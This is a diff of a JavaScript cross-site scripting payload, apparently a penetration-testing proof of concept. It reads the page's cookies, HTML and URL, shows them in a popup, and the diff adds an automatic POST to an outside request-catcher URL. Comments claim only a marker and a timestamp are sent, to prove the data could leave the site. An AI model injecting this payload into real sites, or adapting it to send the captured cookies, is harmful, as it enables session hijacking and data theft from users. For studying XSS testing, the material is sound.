@@ -1,29 +1,39 @@
+//Authoer: JDL
 //<script src="https://jdl-84.github.io/CACHE-XSS/XSS.js"></script> 
-//BEGIN - Update Title for confirmation script loaded
+
+//Update Title for confirmation script loaded
+//We're not trying to be surreptitious about the app testing
 document.title = "XSS-Active"
+
+//APP SPECIFIC 
 //Put Back the variable used to invoke the XSS
-//Script damaged!
 var websession  = '1';
 var mysessionno  = '1';
 var CurrDT          = new Date();
 var TimeAsMS        = CurrDT.getTime();
 var LastRefresh = TimeAsMS;
 var timeoutlength = 9999000;
+//////////
 
-//Get Cookie
+//Get Secrets for display 
 var UsersCookie = document.cookie;
 var DocHTML = document.getElementsByTagName('html')[0].innerHTML;
 var DocLocation = document.location.href;
 
+
 var Toilet = "http://ptsv2.com/t/qo33d-1598654477";
 
-function ExfiltrateData()
+function ExfiltrateData(ID)
 {	
+	 //The popup proves we can obtain the data. 
+	 //Now we need to prove we can move it else where.
+	 //We can't post anything that would indentify the application we've used this script against. 
+	 //ID is the current Timestamp in MS. 	 
+	 //Send Request to Toilet - Thirdparty POST catcher. 
 	 const xhr = new XMLHttpRequest();
 	 xhr.open("POST", Toilet+"/post", true);
 	 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-	 //Don't worry people,  we'll display the data but not actually post it off network
-	 xhr.send("XSS-TEST");	
+	 xhr.send("XSS-TEST-"+ID);	
 }
 
 function createPopup(){
@@ -73,4 +83,6 @@ aExData.target="_blank";
 popup.document.body.appendChild(aExData);
 
 }
+
+ExfiltrateData(TimeAsMS);
 createPopup();
